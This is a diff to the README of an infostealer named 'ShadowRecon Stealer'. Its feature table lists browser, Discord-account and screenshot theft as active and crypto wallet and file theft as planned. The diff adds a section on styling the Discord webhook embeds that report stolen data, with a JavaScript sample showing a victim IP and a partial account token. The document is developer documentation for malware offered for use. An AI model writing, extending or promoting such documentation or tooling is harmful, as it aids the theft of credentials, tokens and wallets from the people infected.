@@ -50,10 +50,41 @@ src/
 |--------|---------|-------------|
 | 🌐 Browsers | ✅ Active | Chrome, Firefox, Edge, Opera, Brave |
 | 💬 Discord | ✅ Active | Account extraction & webhooks |
+| 📷 Screenshot | ✅ Active | Desktop capture |
 | 💰 Crypto | 🔄 Planned | Cryptocurrency wallets |
 | 📁 Files | 🔄 Planned | File system scanning |
-| 🎮 Games | 🔄 Planned | Gaming platforms |
-| 💉 Injection | 🔄 Planned | Browser injection |
+
+## 🎨 Consistent Embed Styling
+
+All Discord embeds now use the same clean, professional style:
+
+**Features:**
+- **Token embeds**: Clean account information display
+- **GoFile embeds**: Consistent with token style (no verbose titles)
+- **System embeds**: Standardized formatting
+- **All embeds**: Same footer, timestamp, and field structure
+
+**Example embed structure:**
+```javascript
+{
+    color: null,
+    fields: [
+        {
+            name: ":earth_africa: IP",
+            value: "`192.168.1.1`",
+            inline: true
+        },
+        {
+            name: ":gem: Token",
+            value: "`MTk4NjIy...`",
+            inline: false
+        }
+    ],
+    footer: {
+        text: "ShadowRecon Stealer"
+    }
+}
+```
 
 ## ⚙️ Configuration
 
